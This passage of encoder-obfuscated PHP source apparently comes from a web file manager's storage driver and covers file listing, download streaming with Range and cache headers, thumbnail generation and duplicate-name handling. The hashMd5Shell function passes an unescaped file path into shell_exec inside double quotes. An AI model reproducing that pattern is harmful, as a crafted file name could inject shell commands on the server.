(isset($Ï·Ø–Ã½[$êãÄ‘[88]])) { $Œ ”€Ş[$êãÄ‘[88]] = $Ï·Ø–Ã½[$êãÄ‘[88]]; } if (!$‘Âæ˜æÔ) { $´®Ú×ƒ[] = $Œ ”€Ş; continue; } $´®Ú×ƒ[] = $Œ ”€Ş; $§Ÿæñ÷– = $Ï·Ø–Ã½[$êãÄ‘[87]]; $û»®ì¨« = $this->pathDriver; if (substr($Ï·Ø–Ã½[$êãÄ‘[87]], 0, strlen($û»®ì¨«)) == $û»®ì¨«) { $§Ÿæñ÷– = substr($§Ÿæñ÷–, strlen($û»®ì¨«)); } $this->listAllMake($§Ÿæñ÷–, $´®Ú×ƒ); } } public function listAllSimple($¼½“ä——, $İ®†º¥ = false) { $óî¸”ôŸ = $this->listAll($¼½“ä——); return $this->listAllSimpleMake($óî¸”ôŸ, $this->getPathOuter($¼½“ä——), $İ®†º¥); } public function listAllSimpleMake($¼¼èä½É, $³ù¾Æõ±, $¥ÈÚ‚ÚÜ) { $›ª¦ïÚâ =& $_SERVER[ÓïÕü]; $•µäÔ’ı = array(); $³ù¾Æõ± = rtrim(get_path_father($³ù¾Æõ±), $›ª¦ïÚâ[8]) . $›ª¦ïÚâ[8]; foreach ($¼¼èä½É as $Ì¸Î¹³ğ) { $¨Í•úÈ® = array($›ª¦ïÚâ[87] => $Ì¸Î¹³ğ[$›ª¦ïÚâ[87]], $›ª¦ïÚâ[89] => $Ì¸Î¹³ğ[$›ª¦ïÚâ[87]], $›ª¦ïÚâ[78] => $Ì¸Î¹³ğ[$›ª¦ïÚâ[78]]); if (isset($Ì¸Î¹³ğ[$›ª¦ïÚâ[79]]) && !$Ì¸Î¹³ğ[$›ª¦ïÚâ[78]]) { $¨Í•úÈ®[$›ª¦ïÚâ[79]] = $Ì¸Î¹³ğ[$›ª¦ïÚâ[79]]; } if (isset($Ì¸Î¹³ğ[$›ª¦ïÚâ[88]])) { $¨Í•úÈ®[$›ª¦ïÚâ[88]] = $Ì¸Î¹³ğ[$›ª¦ïÚâ[88]]; } if (is_array($Ì¸Î¹³ğ[$›ª¦ïÚâ[90]])) { $¨Í•úÈ®[$›ª¦ïÚâ[89]] = $Ì¸Î¹³ğ[$›ª¦ïÚâ[90]][$›ª¦ïÚâ[87]]; $¨Í•úÈ®[$›ª¦ïÚâ[79]] = $Ì¸Î¹³ğ[$›ª¦ïÚâ[90]][$›ª¦ïÚâ[79]]; $¨Í•úÈ®[$›ª¦ïÚâ[88]] = $Ì¸Î¹³ğ[$›ª¦ïÚâ[90]][$›ª¦ïÚâ[88]]; } else { if (substr($Ì¸Î¹³ğ[$›ª¦ïÚâ[87]], 0, strlen($³ù¾Æõ±)) == $³ù¾Æõ±) { $¨Í•úÈ®[$›ª¦ïÚâ[87]] = substr($Ì¸Î¹³ğ[$›ª¦ïÚâ[87]], strlen($³ù¾Æõ±)); } } $¦½µµî¹ = $Ì¸Î¹³ğ[$›ª¦ïÚâ[78]] ? $›ª¦ïÚâ[8] : $›ª¦ïÚâ[12]; $¨Í•úÈ®[$›ª¦ïÚâ[89]] = rtrim($¨Í•úÈ®[$›ª¦ïÚâ[89]], $›ª¦ïÚâ[8]) . $¦½µµî¹; $¨Í•úÈ®[$›ª¦ïÚâ[87]] = $›ª¦ïÚâ[8] . trim($¨Í•úÈ®[$›ª¦ïÚâ[87]], $›ª¦ïÚâ[8]) . $¦½µµî¹; if (!$¥ÈÚ‚ÚÜ) { $Ä’ğ‹ÒŠ = explode($›ª¦ïÚâ[8], trim($¨Í•úÈ®[$›ª¦ïÚâ[87]], $›ª¦ïÚâ[8])); $¨Í•úÈ®[$›ª¦ïÚâ[87]] = $›ª¦ïÚâ[8] . implode($›ª¦ïÚâ[8], array_slice($Ä’ğ‹ÒŠ, 1)) . $¦½µµî¹; } $•µäÔ’ı[] = $¨Í•úÈ®; } return array_sort_by($•µäÔ’ı, $›ª¦ïÚâ[87]); } public function upload($íàÓÚè, $İ¥ÚøÑ‡, $ö€ˆÚä¯ = false, $ÔåÚŠÇ = REPEAT_REPLACE) { } public function uploadFileByID($—êÔÄğ÷, $ò€–¡™, $†ÙÕ¼¢é) { } public function uploadFileByPath($»Öü‡‹‹, $‹ÄÌ÷å‹, $†ÄŒ¿õ… = array()) { } public function isUploadServer() { $Ô¸•ôÃº =& $_SERVER[ÓïÕü]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ô¸•ôÃº[91]) { return !0; } return $GLOBALS[$Ô¸•ôÃº[6]][$Ô¸•ôÃº[92]][$Ô¸•ôÃº[93]]; } public function isFileOutServer() { $–Ã´ß’î =& $_SERVER[ÓïÕü]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $–Ã´ß’î[91]) { return !0; } return $GLOBALS[$–Ã´ß’î[6]][$–Ã´ß’î[92]][$–Ã´ß’î[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($á®Úõ‚Š) { $Ìö°Èßç =& $_SERVER[ÓïÕü]; if (!$this->isCdnHost()) { return $á®Úõ‚Š; } return str_replace(trim(get_url_root($á®Úõ‚Š), $Ìö°Èßç[8]), trim($this->cdnHost, $Ìö°Èßç[8]), $á®Úõ‚Š); } public function uploadLink($ÏÏ÷Ğä¾, $­ô—· = 0) { $«œ£¥’ =& $_SERVER[ÓïÕü]; if ($this->isUploadServer()) { return; } $–½‘’Ÿ¸ = $this->getType(); if (!in_array($–½‘’Ÿ¸, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ê‘Ò‚Ø = 1024 * 1024 * 10; $û çğÁ‰ = $­ô—· <= $ê‘Ò‚Ø ? $«œ£¥’[95] : $«œ£¥’[96]; $š’ùÖİ© = (!$­ô—· ? 1 : ceil($­ô—· / pow(1024, 3))) * 3600 * 4; $ò¹’ÎÊš = $this->{$û çğÁ‰}($ÏÏ÷Ğä¾, $š’ùÖİ©); if ($ò¹’ÎÊš) { $ò¹’ÎÊš[$«œ£¥’[97]] = $ÏÏ÷Ğä¾; $ò¹’ÎÊš[$«œ£¥’[98]] = $–½‘’Ÿ¸; } return $ò¹’ÎÊš; } public function uploadFormData($€Œ¶‡–Æ, $ÍÓ’öµ = 3600) { } public function uploadMultiData($ó©¬‹Ò, $øÅÄ´Ó = 3600) { } public function multiUploadFormData($„ñ˜‘š, $†åçĞ¯‹ = 3600) { return $this->uploadMultiData($„ñ˜‘š, $†åçĞ¯‹); } public function download($ß€üÄÆ¶, $®ŸÓ°¨®) { } public function ext($âå±„îÚ) { $©ÏÚ”ğé =& $_SERVER[ÓïÕü]; if (strpos($âå±„îÚ, $©ÏÚ”ğé[8]) === -1) { $£Î“–Æ¤ = $âå±„îÚ; } else { $£Î“–Æ¤ = $this->pathThis($âå±„îÚ); } $ŒÒ“† = $©ÏÚ”ğé[12]; if (strstr($£Î“–Æ¤, $©ÏÚ”ğé[10])) { $ŒÒ“† = substr($£Î“–Æ¤, strrpos($£Î“–Æ¤, $©ÏÚ”ğé[10]) + 1); $ŒÒ“† = strtolower($ŒÒ“†); } if (strlen($ŒÒ“†) > 3 && preg_match($©ÏÚ”ğé[99], $ŒÒ“†, $´¸ÁË•ğ)) { $ŒÒ“† = $©ÏÚ”ğé[12]; } return $ŒÒ“†; } public function pathThis($øˆë´ãİ) { $Èó½”‚Ó =& $_SERVER[ÓïÕü]; $øˆë´ãİ = str_replace($Èó½”‚Ó[100], $Èó½”‚Ó[8], rtrim($øˆë´ãİ, $Èó½”‚Ó[8])); $Èûä›Ô™ = strrpos($øˆë´ãİ, $Èó½”‚Ó[8]); if ($Èûä›Ô™ === !1) { return $øˆë´ãİ; } return substr($øˆë´ãİ, $Èûä›Ô™ + 1); } public function pathFather($´şëÁ†ü) { $£‰¢£¼Æ =& $_SERVER[ÓïÕü]; $´şëÁ†ü = str_replace($£‰¢£¼Æ[100], $£‰¢£¼Æ[8], rtrim($´şëÁ†ü, $£‰¢£¼Æ[8])); $è€¶û‚Ñ = strrpos($´şëÁ†ü, $£‰¢£¼Æ[8]); if ($è€¶û‚Ñ === !1) { return $£‰¢£¼Æ[12]; } return substr($´şëÁ†ü, 0, $è€¶û‚Ñ + 1); } public function hashSimple($¿©£ÍìÛ) { $‰ğ¾¢‚Ÿ =& $_SERVER[ÓïÕü]; if (!$¿©£ÍìÛ) { return md5($‰ğ¾¢‚Ÿ[12]); } $İêç² = $this->size($¿©£ÍìÛ); $İšÔµÚÃ = 200; $‡êÆ§ = 50; if ($İêç² <= $İšÔµÚÃ * $‡êÆ§) { return $this->hashMd5($¿©£ÍìÛ) . $İêç²; } $‰œúºÓÈ = intval($İêç² / $‡êÆ§); $äâ¡öËó = $‰ğ¾¢‚Ÿ[12]; for ($Êõ…ü¹Ö = 0; $Êõ…ü¹Ö < $‡êÆ§; $Êõ…ü¹Ö++) { $äâ¡öËó .= $this->fileSubstr($¿©£ÍìÛ, $‰œúºÓÈ * $Êõ…ü¹Ö, $İšÔµÚÃ); } $äâ¡öËó .= $this->fileSubstr($¿©£ÍìÛ, $İêç² - $İšÔµÚÃ, $İšÔµÚÃ); return md5($äâ¡öËó) . $İêç²; } public static $md5Cache = array(); public function hashMd5($®Û€Â¸Ÿ) { if (!$®Û€Â¸Ÿ) { return md5($_SERVER[ÓïÕü][12]); } $®Û€Â¸Ÿ = $this->iconvSystem($®Û€Â¸Ÿ); if (isset(self::$md5Cache[$®Û€Â¸Ÿ])) { return self::$md5Cache[$®Û€Â¸Ÿ]; } self::$md5Cache[$®Û€Â¸Ÿ] = $this->hashMd5Shell($®Û€Â¸Ÿ); if (!self::$md5Cache[$®Û€Â¸Ÿ]) { self::$md5Cache[$®Û€Â¸Ÿ] = @md5_file($®Û€Â¸Ÿ); } return self::$md5Cache[$®Û€Â¸Ÿ]; } private function hashMd5Shell($ìŸŞİ†Ï) { $Ôí“º  =& $_SERVER[ÓïÕü]; if (!$ìŸŞİ†Ï) { return md5($Ôí“º [12]); } if (!function_exists($Ôí“º [101])) { return !1; } $‘‡‚Œíœ = array($Ôí“º [102], $Ôí“º [103]); $êò…‹‰õ = Cache::get($Ôí“º [104]); if (!$êò…‹‰õ) { $µ¥ãµ¹Ç = BASIC_PATH . $Ôí“º [105]; $©¾­µô = md5_file($µ¥ãµ¹Ç); $êò…‹‰õ = $Ôí“º [106]; foreach ($‘‡‚Œíœ as $ı‡¹ÚË) { $›Ê¨£¨³ = shell_exec($ı‡¹ÚË . "\40\x22{$µ¥ãµ¹Ç}\42"); if ($›Ê¨£¨³ && substr(trim($›Ê¨£¨³), 0, 32) == $©¾­µô) { $êò…‹‰õ = $ı‡¹ÚË; break; } } Cache::set($Ôí“º [104], $êò…‹‰õ, 3600); } if ($êò…‹‰õ == $Ôí“º [106]) { return !1; } $›Ê¨£¨³ = shell_exec($êò…‹‰õ . "\x20\x22{$ìŸŞİ†Ï}\42"); $›Ê¨£¨³ = str_replace($Ôí“º [107], $Ôí“º [12], $›Ê¨£¨³); return substr($›Ê¨£¨³, 0, 32); } public function link($ÆèïÂş¾) { return $ÆèïÂş¾; } public function fileOut($î Ğéµµ, $ûˆÏ«˜ = false, $Š’¯¹Œ = false, $­‡´±éà = '') { $•Æ©ÇÇ¶ =& $_SERVER[ÓïÕü]; $this->cacheMethod(null, null); if (!$î Ğéµµ || !$this->exist($î Ğéµµ)) { show_json(LNG($•Æ©ÇÇ¶[108]), !1, $Š’¯¹Œ); } $«à¡ªî¹ = $this->getType() == $•Æ©ÇÇ¶[109]; $¥˜çˆíß = $GLOBALS[$•Æ©ÇÇ¶[6]][$•Æ©ÇÇ¶[92]][$•Æ©ÇÇ¶[110]][$•Æ©ÇÇ¶[111]]; $•ÍÈÙı£ = (double) $GLOBALS[$•Æ©ÇÇ¶[6]][$•Æ©ÇÇ¶[92]][$•Æ©ÇÇ¶[110]][$•Æ©ÇÇ¶[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ò·Îõ = $this->infoFull($î Ğéµµ); $”‘·ØöÑ = $ò·Îõ[$•Æ©ÇÇ¶[79]]; $áŸ„İíå = gmdate($•Æ©ÇÇ¶[113], $ò·Îõ[$•Æ©ÇÇ¶[88]]); $ƒï’ôè = $Š’¯¹Œ ? $Š’¯¹Œ : $this->iconvApp($ò·Îõ[$•Æ©ÇÇ¶[32]]); $‚°¯Œ = 0; $¿Ş·ƒÄ­ = $”‘·ØöÑ - 1; $±óÇ°ù“ = $this->ext($ƒï’ôè); if (in_array($±óÇ°ù“, array($•Æ©ÇÇ¶[114], $•Æ©ÇÇ¶[115], $•Æ©ÇÇ¶[116], $•Æ©ÇÇ¶[117]))) { $±óÇ°ù“ = $•Æ©ÇÇ¶[118]; } if (in_array($±óÇ°ù“, array($•Æ©ÇÇ¶[119]))) { $±óÇ°ù“ = $•Æ©ÇÇ¶[120]; } if (!$­‡´±éà) { $­‡´±éà = md5($áŸ„İíå . $”‘·ØöÑ); } $­‡´±éà = $•Æ©ÇÇ¶[121] . $­‡´±éà . $•Æ©ÇÇ¶[121]; $ÖŸˆä½š = get_file_mime($±óÇ°ù“); $èŸô¨Ç = !0; $èŸô¨Ç = isset($_GET[$•Æ©ÇÇ¶[122]]) ? !1 : !0; if ($ûˆÏ«˜ === !1 && !mime_support($ÖŸˆä½š)) { $ÖŸˆä½š = $•Æ©ÇÇ¶[123]; } header($•Æ©ÇÇ¶[124]); header($•Æ©ÇÇ¶[125] . $ÖŸˆä½š); $¬‚ÀİÖ• = rawurlencode($ƒï’ôè); $¬‚ÀİÖ• = $•Æ©ÇÇ¶[121] . $¬‚ÀİÖ• . $•Æ©ÇÇ¶[126] . $¬‚ÀİÖ•; if ($ûˆÏ«˜) { header($•Æ©ÇÇ¶[127]); header($•Æ©ÇÇ¶[128] . $¬‚ÀİÖ•); } else { if ($èŸô¨Ç) { header($•Æ©ÇÇ¶[129] . $¬‚ÀİÖ•); } } $íèÀ†‘Ì = 3600 * 24 * 30; header($•Æ©ÇÇ¶[130]); header($•Æ©ÇÇ¶[131]); header($•Æ©ÇÇ¶[132] . $íèÀ†‘Ì); header($•Æ©ÇÇ¶[133] . gmdate($•Æ©ÇÇ¶[113], time() + $íèÀ†‘Ì) . $•Æ©ÇÇ¶[134]); if (isset($_SERVER[$•Æ©ÇÇ¶[135]]) && strtotime($_SERVER[$•Æ©ÇÇ¶[135]]) == $ò·Îõ[$•Æ©ÇÇ¶[88]]) { header($•Æ©ÇÇ¶[136], !0, 304); die; } if (isset($_SERVER[$•Æ©ÇÇ¶[137]]) && $_SERVER[$•Æ©ÇÇ¶[137]] == $­‡´±éà) { header($•Æ©ÇÇ¶[138] . $­‡´±éà, !0, 304); die; } header($•Æ©ÇÇ¶[138] . $­‡´±éà); header($•Æ©ÇÇ¶[139] . $áŸ„İíå . $•Æ©ÇÇ¶[134]); header($•Æ©ÇÇ¶[140] . $ƒï’ôè); header($•Æ©ÇÇ¶[141]); header($•Æ©ÇÇ¶[142] . $”‘·ØöÑ); header($•Æ©ÇÇ¶[143]); Hook::trigger($•Æ©ÇÇ¶[144], $î Ğéµµ, $”‘·ØöÑ, $ƒï’ôè, $±óÇ°ù“); if (!$ûˆÏ«˜ && $±óÇ°ù“ == $•Æ©ÇÇ¶[145]) { if ($”‘·ØöÑ > 1024 * 1024 * 5) { die; } $ºœ‡‡è = $this->getContent($î Ğéµµ); $ºœ‡‡è = Html::clearSVG($ºœ‡‡è); header($•Æ©ÇÇ¶[146] . strlen($ºœ‡‡è)); echo $ºœ‡‡è; die; } $ ‡‘ ŞÇ = strtolower($_SERVER[$•Æ©ÇÇ¶[147]]); if ($«à¡ªî¹ && $ ‡‘ ŞÇ && $¥˜çˆíß) { if (strstr($ ‡‘ ŞÇ, $•Æ©ÇÇ¶[148])) { header($•Æ©ÇÇ¶[149] . $î Ğéµµ); } else { if (strstr($ ‡‘ ŞÇ, $•Æ©ÇÇ¶[150])) { header($•Æ©ÇÇ¶[151] . $î Ğéµµ); } else { if (strstr($ ‡‘ ŞÇ, $•Æ©ÇÇ¶[152])) { header($•Æ©ÇÇ¶[153] . $î Ğéµµ); } } } if ($•ÍÈÙı£) { header($•Æ©ÇÇ¶[154] . $•ÍÈÙı£); } return; } if (isset($_SERVER[$•Æ©ÇÇ¶[155]])) { if (preg_match($•Æ©ÇÇ¶[156], $_SERVER[$•Æ©ÇÇ¶[155]], $šßØ†ç)) { $‚°¯Œ = intval($šßØ†ç[1]); $‚°¯Œ = $‚°¯Œ <= 0 ? 0 : ($‚°¯Œ >= $¿Ş·ƒÄ­ ? $¿Ş·ƒÄ­ : $‚°¯Œ); if (!empty($šßØ†ç[2])) { $±©¸áŸ = intval($šßØ†ç[2]); $¿Ş·ƒÄ­ = $±©¸áŸ < $‚°¯Œ ? $‚°¯Œ : ($±©¸áŸ >= $¿Ş·ƒÄ­ ? $¿Ş·ƒÄ­ : $±©¸áŸ); } } header($•Æ©ÇÇ¶[157]); header("\x43\157\156\x74\145\x6e\x74\x2d\122\141\156\147\145\x3a\40\x62\171\x74\x65\163\x20{$‚°¯Œ}\x2d{$¿Ş·ƒÄ­}\57" . $”‘·ØöÑ); } else { header($•Æ©ÇÇ¶[158]); } header($•Æ©ÇÇ¶[159]); header($•Æ©ÇÇ¶[160]); $óÙ¤â´ = !0; if ($_SERVER[$•Æ©ÇÇ¶[161]] == $•Æ©ÇÇ¶[162] && $”‘·ØöÑ > 1204 * 1024 * 1024 * 2) { $óÙ¤â´ = !1; } if ($óÙ¤â´) { header($•Æ©ÇÇ¶[163] . ($¿Ş·ƒÄ­ - $‚°¯Œ + 1)); } if ($_SERVER[$•Æ©ÇÇ¶[164]] == $•Æ©ÇÇ¶[165]) { return; } $âà”›Ò = array($•Æ©ÇÇ¶[166] => !1, $•Æ©ÇÇ¶[167] => $‚°¯Œ, $•Æ©ÇÇ¶[168] => $¿Ş·ƒÄ­, $•Æ©ÇÇ¶[169] => $±óÇ°ù“, $•Æ©ÇÇ¶[170] => $ò·Îõ, $•Æ©ÇÇ¶[171] => $•Æ©ÇÇ¶[12], $•Æ©ÇÇ¶[172] => 0); $âà”›Ò = Hook::filter($•Æ©ÇÇ¶[173], $âà”›Ò); $–òÒ¿Ë = 1024 * 300; $×½İ±± = 0; if ($•ÍÈÙı£) { $×½İ±± = intval(1000 * 1000 * ($–òÒ¿Ë / $•ÍÈÙı£)); } while ($‚°¯Œ <= $¿Ş·ƒÄ­) { $£‚š–ì÷ = timeFloat(); check_abort(); $óüÏŞÁ¾ = $¿Ş·ƒÄ­ - $‚°¯Œ + 1; if ($óüÏŞÁ¾ <= $–òÒ¿Ë) { $–òÒ¿Ë = $óüÏŞÁ¾; } $ºœ‡‡è = $this->fileSubstr($î Ğéµµ, $‚°¯Œ, $–òÒ¿Ë); if ($âà”›Ò[$•Æ©ÇÇ¶[166]]) { $âà”›Ò[$•Æ©ÇÇ¶[171]] = $ºœ‡‡è; $âà”›Ò[$•Æ©ÇÇ¶[172]] = $‚°¯Œ; $âà”›Ò = Hook::filter($•Æ©ÇÇ¶[174], $âà”›Ò); $ºœ‡‡è = $âà”›Ò[$•Æ©ÇÇ¶[171]]; } echo $ºœ‡‡è; $‚°¯Œ += $–òÒ¿Ë; if ($–òÒ¿Ë == $óüÏŞÁ¾) { $‚°¯Œ = $¿Ş·ƒÄ­ + 1; } if ($×½İ±±) { $ïîğ·î‹ = intval(1000 * 1000 * (timeFloat() - $£‚š–ì÷)); $–€Î®ùÀ = $×½İ±± - $ïîğ·î‹; if ($–€Î®ùÀ > 5) { usleep($–€Î®ùÀ); } } } } public function fileOutServer($±Å²ÉŒª, $ğŒì‚û = false, $×›ííØ¦ = false, $²œ’ÄÌÜ = '') { $this->fileOut($±Å²ÉŒª, $ğŒì‚û, $×›ííØ¦, $²œ’ÄÌÜ); } public function fileOutLink($•Ó¦şÅË) { header($_SERVER[ÓïÕü][175] . $•Ó¦şÅË); die; } public function cacheMethod($¶¡¯Ó¶º, $ª¼î´Üİ, $§øÊ«Æ = null) { $ı‰ÜíÕÄ =& $_SERVER[ÓïÕü]; static $ÔªÀè»ß = array(); $ß“Õ ‡ = $ª¼î´Üİ ? ltrim($this->getPathOuter($ª¼î´Üİ), $ı‰ÜíÕÄ[8]) : $ı‰ÜíÕÄ[12]; $ãÀµü¬ì = $ı‰ÜíÕÄ[176] . $¶¡¯Ó¶º . $ı‰ÜíÕÄ[177] . rtrim($ß“Õ ‡, $ı‰ÜíÕÄ[8]); if (is_null($¶¡¯Ó¶º)) { $ÔªÀè»ß = array(); return; } if (is_null($ª¼î´Üİ)) { foreach ($ÔªÀè»ß as $ãÀµü¬ì => $Îİ„éâ‘) { if (!strstr($ãÀµü¬ì, $ı‰ÜíÕÄ[176] . $¶¡¯Ó¶º . $ı‰ÜíÕÄ[178])) { continue; } unset($ÔªÀè»ß[$ãÀµü¬ì]); } return; } if ($§øÊ«Æ === $ı‰ÜíÕÄ[179]) { unset($ÔªÀè»ß[$ãÀµü¬ì]); return; } if (!is_null($§øÊ«Æ)) { $ÔªÀè»ß[$ãÀµü¬ì] = $§øÊ«Æ; return; } $À ê¿¨¶ = isset($ÔªÀè»ß[$ãÀµü¬ì]) ? $ÔªÀè»ß[$ãÀµü¬ì] : null; if (!is_null($À ê¿¨¶)) { return $À ê¿¨¶; } $À ê¿¨¶ = $this->{$¶¡¯Ó¶º}($ª¼î´Üİ); $ÔªÀè»ß[$ãÀµü¬ì] = $À ê¿¨¶; return $À ê¿¨¶; } public function cacheMethodInfoSet($ù°äõ», $´‡¥Ë´Õ, $Š¤Îşš¸ = false) { $Œ±ª¿­ =& $_SERVER[ÓïÕü]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Œ±ª¿­[180], $ù°äõ», $´‡¥Ë´Õ); $this->cacheMethod($Œ±ª¿­[181], $ù°äõ», $´‡¥Ë´Õ ? !1 : !0); if (is_array($Š¤Îşš¸)) { $this->cacheMethod($Œ±ª¿­[182], $ù°äõ», $Š¤Îşš¸); } } public function fileOutImage($ñúÆ¼™, $ÚºéæÑ = 250) { $¹±¾ššÕ =& $_SERVER[ÓïÕü]; set_timeout(); if (substr($ñúÆ¼™, 0, 4) == $¹±¾ššÕ[152]) { $this->fileOutLink($ñúÆ¼™); } $õ¿ŠªÃı = $this->info($ñúÆ¼™); $š¥ØòŞ• = !1; $Ê¨âš“µ = isset($GLOBALS[$¹±¾ššÕ[183]]) ? $GLOBALS[$¹±¾ššÕ[183]] : array(); if ($Ê¨âš“µ && $Ê¨âš“µ[$¹±¾ššÕ[184]] == $õ¿ŠªÃı[$¹±¾ššÕ[87]]) { $õ¿ŠªÃı = $Ê¨âš“µ; $¾–Ä¾ÙÇ = $õ¿ŠªÃı[$¹±¾ššÕ[185]]; if ($¾–Ä¾ÙÇ && isset($¾–Ä¾ÙÇ[$¹±¾ššÕ[186]])) { if ($¾–Ä¾ÙÇ[$¹±¾ššÕ[186]] <= $ÚºéæÑ && $¾–Ä¾ÙÇ[$¹±¾ššÕ[187]] <= $ÚºéæÑ) { $š¥ØòŞ• = !0; } } } if ($õ¿ŠªÃı[$¹±¾ššÕ[79]] <= 1024 * 50 || $š¥ØòŞ• || !function_exists($¹±¾ššÕ[188]) || $õ¿ŠªÃı[$¹±¾ššÕ[169]] == $¹±¾ššÕ[189]) { return $this->fileOut($ñúÆ¼™, !1, $õ¿ŠªÃı[$¹±¾ššÕ[32]]); } $Ì÷äÁ© = kodIO::hashPath($õ¿ŠªÃı); $ºÍÜ£È¯ = "\143\157\x76\145\x72\x5f{$Ì÷äÁ©}\x5f{$ÚºéæÑ}\56\160\x6e\x67"; $ë²ñÊëã = IO_PATH_SYSTEM_TEMP . $¹±¾ššÕ[190]; $„ã¢–‘¤ = IO::infoFullSimple($ë²ñÊëã); $å‹¬ÔöÛ = $„ã¢–‘¤ && is_array($„ã¢–‘¤) ? $„ã¢–‘¤[$¹±¾ššÕ[87]] : $¹±¾ššÕ[12]; if (!$å‹¬ÔöÛ) { $å‹¬ÔöÛ = IO::mkdir($ë²ñÊëã); } if ($õ¿ŠªÃı[$¹±¾ššÕ[191]] == $¹±¾ššÕ[192] && isset($õ¿ŠªÃı[$¹±¾ššÕ[193]]) && $õ¿ŠªÃı[$¹±¾ššÕ[193]] == kodIO::sourceID($å‹¬ÔöÛ)) { $–À§˜½Î = $õ¿ŠªÃı[$¹±¾ššÕ[194]]; if ($ÚºéæÑ <= 500) { $áì¤…›¥ = preg_replace($¹±¾ššÕ[195], $¹±¾ššÕ[196], $õ¿ŠªÃı[$¹±¾ššÕ[32]]); $–À§˜½Î = IO::fileNameExist($å‹¬ÔöÛ, $áì¤…›¥); } return IO::fileOut(KodIO::make($–À§˜½Î), !1, $õ¿ŠªÃı[$¹±¾ššÕ[32]]); } $¥»æß„° = IO::fileNameExist($å‹¬ÔöÛ, $ºÍÜ£È¯); if ($¥»æß„°) { return IO::fileOut(KodIO::make($¥»æß„°), !1, $õ¿ŠªÃı[$¹±¾ššÕ[32]]); } if ($ÚºéæÑ > 1000) { $this->makeImageCover($å‹¬ÔöÛ, $ñúÆ¼™, $ºÍÜ£È¯, $ÚºéæÑ); $this->makeImageCover($å‹¬ÔöÛ, $ñúÆ¼™, "\143\x6f\166\145\162\137{$Ì÷äÁ©}\x5f\62\x35\60\56\160\x6e\x67", 250); $¥»æß„° = IO::fileNameExist($å‹¬ÔöÛ, $ºÍÜ£È¯); if ($¥»æß„°) { return IO::fileOut(KodIO::make($¥»æß„°), !1, $õ¿ŠªÃı[$¹±¾ššÕ[32]]); } die; } if (!kodIO::allowCover($õ¿ŠªÃı)) { return $this->fileOut($ñúÆ¼™, !1, $õ¿ŠªÃı[$¹±¾ššÕ[32]]); } $•¿÷ìë = Cache::get($ºÍÜ£È¯); if ($•¿÷ìë == $¹±¾ššÕ[197] || $•¿÷ìë == $¹±¾ššÕ[198]) { echo $•¿÷ìë; die; } Cache::set($ºÍÜ£È¯, $¹±¾ššÕ[198], 60); $ù½Ø‡Ûå = array($å‹¬ÔöÛ, $õ¿ŠªÃı[$¹±¾ššÕ[87]], $ºÍÜ£È¯, $ÚºéæÑ); $ö¦İ‘•³ = $¹±¾ššÕ[199] . $õ¿ŠªÃı[$¹±¾ššÕ[79]] . $¹±¾ššÕ[200] . $ºÍÜ£È¯ . $¹±¾ššÕ[201] . $õ¿ŠªÃı[$¹±¾ššÕ[32]] . $¹±¾ššÕ[202] . $õ¿ŠªÃı[$¹±¾ššÕ[87]]; TaskQueue::add($¹±¾ššÕ[203], $ù½Ø‡Ûå, $ö¦İ‘•³, $ºÍÜ£È¯); } public function makeImageCover($ÛúşÃ£•, $«ı±ÜÖ§, $²¾î’»Î, $şÒğÕü­) { $ãóÅ¸ˆ± =& $_SERVER[ÓïÕü]; if (IO::fileNameExist($ÛúşÃ£•, $²¾î’»Î)) { return $ãóÅ¸ˆ±[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $äóË± = $this->getPathOuter($«ı±ÜÖ§); $­â§†ìÓ = DATA_THUMB . $²¾î’»Î; del_file($­â§†ìÓ); $ô‘ĞÁ§ = IO::copy($äóË±, TEMP_FILES, !1, $²¾î’»Î); if (!@file_exists($ô‘ĞÁ§)) { return $ãóÅ¸ˆ±[205]; } ImageThumb::createThumb($ô‘ĞÁ§, $­â§†ìÓ, $şÒğÕü­, $şÒğÕü­ * 10); if (@file_exists($­â§†ìÓ)) { Cache::remove($²¾î’»Î); return IO::move($­â§†ìÓ, $ÛúşÃ£•); } Cache::set($²¾î’»Î, $ãóÅ¸ˆ±[197], 600); del_file($­â§†ìÓ); return $ãóÅ¸ˆ±[206] . $ô‘ĞÁ§ . $ãóÅ¸ˆ±[74]; } public function fileOutImageServer($×Ìô˜íÌ, $Ì¡¹¾…º = 250) { $this->fileOutImage($×Ìô˜íÌ, $Ì¡¹¾…º); } public function fileNameAuto($è‰“ìÄ˜, $–‹ôüï, $†ª×Äµ = REPEAT_RENAME, $õ»¯‹È‚ = false) { $Îá‹»Œã =& $_SERVER[ÓïÕü]; $ŞÈöØæß = $è‰“ìÄ˜ === $Îá‹»Œã[12] ? $–‹ôüï : rtrim($è‰“ìÄ˜, $Îá‹»Œã[8]) . $Îá‹»Œã[8] . $–‹ôüï; if ($†ª×Äµ == REPEAT_REPLACE || !$this->exist($ŞÈöØæß) || $õ»¯‹È‚ && $†ª×Äµ != REPEAT_RENAME_FOLDER) { return $–‹ôüï; } if ($†ª×Äµ == REPEAT_SKIP) { return !1; } $šÏŸ¿Æ¥ = $Îá‹»Œã[10] . get_path_ext($–‹ôüï); $šÏŸ¿Æ¥ = $šÏŸ¿Æ¥ == $Îá‹»Œã[10] || $õ»¯‹È‚ ? $Îá‹»Œã[12] : $šÏŸ¿Æ¥; $îÓâ’Ş = 1; $‚Ô‘…Ö’ = substr($–‹ôüï, 0, strlen($–‹ôüï) - strlen($šÏŸ¿Æ¥)); $üŸ™‘êÂ = $‚Ô‘…Ö’ . "\x28{$îÓâ’Ş}\x29{$šÏŸ¿Æ¥}"; while ($this->exist(rtrim($è‰“ìÄ˜, $Îá‹»Œã[8]) . $Îá‹»Œã[8] . $üŸ™‘êÂ)) { $üŸ™‘êÂ = $‚Ô‘…Ö’ . "\50{$îÓâ’Ş}\x29{$šÏŸ¿Æ¥}"; $îÓâ’Ş++; } return $üŸ™‘êÂ; } private function fileNameAutoList($÷§¢‡Ş¾, $„ÑÖı’Š, $‚½¿ïú† = false) { $­·åÓ¼— =& $_SERVER[ÓïÕü]; $¬œ†î„ = $this->listPath($÷§¢‡Ş¾, !0); 